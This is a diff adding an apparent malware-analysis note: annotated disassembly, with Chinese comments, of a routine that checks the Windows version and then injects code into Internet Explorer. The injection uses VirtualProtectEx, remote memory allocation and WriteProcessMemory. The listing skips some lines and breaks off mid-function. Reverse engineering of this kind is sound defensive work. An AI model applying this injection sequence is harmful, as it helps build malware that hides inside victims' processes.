@@ -1,0 +1,122 @@
+
+```
+  00405EDB  |.  64:8910       mov     dword ptr fs:[eax], edx
+  00405EDE  |.  68 FB5E4000   push    00405EFB
+  00405EE3  |>  8D85 64FFFFFF lea     eax, dword ptr [ebp-9C]
+  00405EE9  |.  BA 02000000   mov     edx, 2
+  00405EEE  |.  E8 A9DBFFFF   call    00403A9C
+  00405EF3  \.  C3            retn                                     ;  以上代码是通过GetVersionExA来检测是什么版本的操作系统
+  ********************************************************************************************************************************************************************
+  004068FC  /$  55               push    ebp
+  004068FD  |.  8BEC             mov     ebp, esp
+  004068FF  |.  81C4 10FFFFFF    add     esp, -0F0
+  省略N行代码
+  0040694F  |.  E8 F0FCFFFF      call    00406644                            ;  注入进程，所注入的进程是根据自己的配置注入的，我这里是注入IE
+  00406954  |.  8D45 E0          lea     eax, dword ptr [ebp-20]
+  00406957  |.  50               push    eax
+  00406958  |.  8B45 08          mov     eax, dword ptr [ebp+8]
+  0040695B  |.  50               push    eax
+  0040695C  |.  8D45 F0          lea     eax, dword ptr [ebp-10]
+  0040695F  |.  50               push    eax
+  00406960  |.  8D45 EC          lea     eax, dword ptr [ebp-14]
+  00406963  |.  50               push    eax
+  00406964  |.  8D4D F8          lea     ecx, dword ptr [ebp-8]
+  00406967  |.  8D95 14FFFFFF    lea     edx, dword ptr [ebp-EC]
+  0040696D  |.  8B45 F4          mov     eax, dword ptr [ebp-C]
+  00406970  |.  E8 73FEFFFF      call    004067E8
+  00406975  |.  84C0             test    al, al
+  00406977  |.  0F84 7E010000    je      00406AFB
+  0040697D  |.  33C0             xor     eax, eax
+  0040697F  |.  8945 E4          mov     dword ptr [ebp-1C], eax
+  00406982  |.  8B43 34          mov     eax, dword ptr [ebx+34]
+  00406985  |.  3B45 F0          cmp     eax, dword ptr [ebp-10]
+  00406988  |.  75 27            jnz     short 004069B1
+  0040698A  |.  8B45 EC          mov     eax, dword ptr [ebp-14]
+  0040698D  |.  3B45 0C          cmp     eax, dword ptr [ebp+C]
+  00406990  |.  72 1F            jb      short 004069B1
+  00406992  |.  8B45 F0          mov     eax, dword ptr [ebp-10]
+  00406995  |.  8945 E4          mov     dword ptr [ebp-1C], eax
+  00406998  |.  8D45 E8          lea     eax, dword ptr [ebp-18]
+  0040699B  |.  50               push    eax                                 ; /pOldProtect
+  0040699C  |.  6A 40            push    40                                  ; |NewProtect = PAGE_EXECUTE_READWRITE
+  0040699E  |.  8B45 EC          mov     eax, dword ptr [ebp-14]             ; |
+  004069A1  |.  50               push    eax                                 ; |Size
+  004069A2  |.  8B45 E4          mov     eax, dword ptr [ebp-1C]             ; |
+  004069A5  |.  50               push    eax                                 ; |Address
+  004069A6  |.  8B45 F8          mov     eax, dword ptr [ebp-8]              ; |
+  004069A9  |.  50               push    eax                                 ; |hProcess
+  004069AA  |.  E8 29E1FFFF      call    <jmp.&kernel32.VirtualProtectEx>    ; \VirtualProtectEx
+  004069AF  |.  EB 72            jmp     short 00406A23
+  004069B1  |>  E8 82FCFFFF      call    00406638
+  004069B6  |.  84C0             test    al, al
+  004069B8  |.  74 69            je      short 00406A23
+  004069BA  |.  8B55 F0          mov     edx, dword ptr [ebp-10]
+  004069BD  |.  8B45 F8          mov     eax, dword ptr [ebp-8]
+  004069C0  |.  E8 B7FDFFFF      call    0040677C
+  004069C5  |.  84C0             test    al, al
+  004069C7  |.  74 1C            je      short 004069E5
+  004069C9  |.  6A 40            push    40
+  004069CB  |.  68 00300000      push    3000
+  004069D0  |.  8B45 0C          mov     eax, dword ptr [ebp+C]
+  004069D3  |.  50               push    eax
+  004069D4  |.  8B43 34          mov     eax, dword ptr [ebx+34]
+  004069D7  |.  50               push    eax
+  004069D8  |.  8B45 F8          mov     eax, dword ptr [ebp-8]
+  004069DB  |.  50               push    eax
+  004069DC  |.  FF15 CC804000    call    dword ptr [4080CC]
+  004069E2  |.  8945 E4          mov     dword ptr [ebp-1C], eax
+  004069E5  |>  837D E4 00       cmp     dword ptr [ebp-1C], 0
+  004069E9  |.  75 38            jnz     short 00406A23
+  004069EB  |.  8BC3             mov     eax, ebx
+  004069ED  |.  E8 0AFDFFFF      call    004066FC
+  004069F2  |.  84C0             test    al, al
+  004069F4  |.  74 2D            je      short 00406A23
+  004069F6  |.  6A 40            push    40
+  004069F8  |.  68 00300000      push    3000
+  004069FD  |.  8B45 0C          mov     eax, dword ptr [ebp+C]
+  00406A00  |.  50               push    eax
+  00406A01  |.  6A 00            push    0
+  00406A03  |.  8B45 F8          mov     eax, dword ptr [ebp-8]
+  00406A06  |.  50               push    eax
+  00406A07  |.  FF15 CC804000    call    dword ptr [4080CC]
+  00406A0D  |.  8945 E4          mov     dword ptr [ebp-1C], eax
+  00406A10  |.  837D E4 00       cmp     dword ptr [ebp-1C], 0
+  00406A14  |.  74 0D            je      short 00406A23
+  00406A16  |.  8B4D E4          mov     ecx, dword ptr [ebp-1C]
+  00406A19  |.  8B55 10          mov     edx, dword ptr [ebp+10]
+  00406A1C  |.  8BC3             mov     eax, ebx
+  00406A1E  |.  E8 F1FCFFFF      call    00406714
+  00406A23  |>  837D E4 00       cmp     dword ptr [ebp-1C], 0
+  00406A27  |.  0F84 AA000000    je      00406AD7
+  00406A2D  |.  8D45 E8          lea     eax, dword ptr [ebp-18]
+  00406A30  |.  50               push    eax                                 ; /pBytesWritten
+  00406A31  |.  6A 04            push    4                                   ; |BytesToWrite = 4
+  00406A33  |.  8D45 E4          lea     eax, dword ptr [ebp-1C]             ; |
+  00406A36  |.  50               push    eax                                 ; |Buffer
+  00406A37  |.  8B45 B8          mov     eax, dword ptr [ebp-48]             ; |
+  00406A3A  |.  83C0 08          add     eax, 8                              ; |
+  00406A3D  |.  50               push    eax                                 ; |Address
+  00406A3E  |.  8B45 F8          mov     eax, dword ptr [ebp-8]              ; |
+  00406A41  |.  50               push    eax                                 ; |hProcess
+  00406A42  |.  E8 B1E0FFFF      call    <jmp.&kernel32.WriteProcessMemory>  ; \WriteProcessMemory
+  00406A47  |.  8B45 E4          mov     eax, dword ptr [ebp-1C]
+  00406A4A  |.  8943 34          mov     dword ptr [ebx+34], eax
+  00406A4D  |.  8D45 E8          lea     eax, dword ptr [ebp-18]
+  00406A50  |.  50               push    eax                                 ; /pBytesWritten
+  00406A51  |.  8B45 0C          mov     eax, dword ptr [ebp+C]              ; |
+  00406A54  |.  50               push    eax                                 ; |BytesToWrite
+  00406A55  |.  8B45 10          mov     eax, dword ptr [ebp+10]             ; |
+  00406A58  |.  50               push    eax                                 ; |Buffer
+  00406A59  |.  8B45 E4          mov     eax, dword ptr [ebp-1C]             ; |
+  00406A5C  |.  50               push    eax                                 ; |Address
+  00406A5D  |.  8B45 F8          mov     eax, dword ptr [ebp-8]              ; |
+  00406A60  |.  50               push    eax                                 ; |hProcess
+  00406A61  |.  E8 92E0FFFF      call    <jmp.&kernel32.WriteProcessMemory>  ; \WriteProcessMemory
+  00406A66  |.  85C0             test    eax, eax
+  00406A68  |.  74 47            je      short 00406AB1
+  00406A6A  |.  C785 14FFFFFF 07>mov     dword ptr [ebp-EC], 10007
+  00406A74  |.  8B45 E4          mov     eax, dword ptr [ebp-1C]
+  00406A77  |.  3B45 F0          cmp     eax, dword ptr [ebp-10]
+  00406A7A  |.  75 0B            jnz     short 00406A87
+  00406A7C  |.  8B43 34          mov     eax, dword ptr [ebx+34]
+```
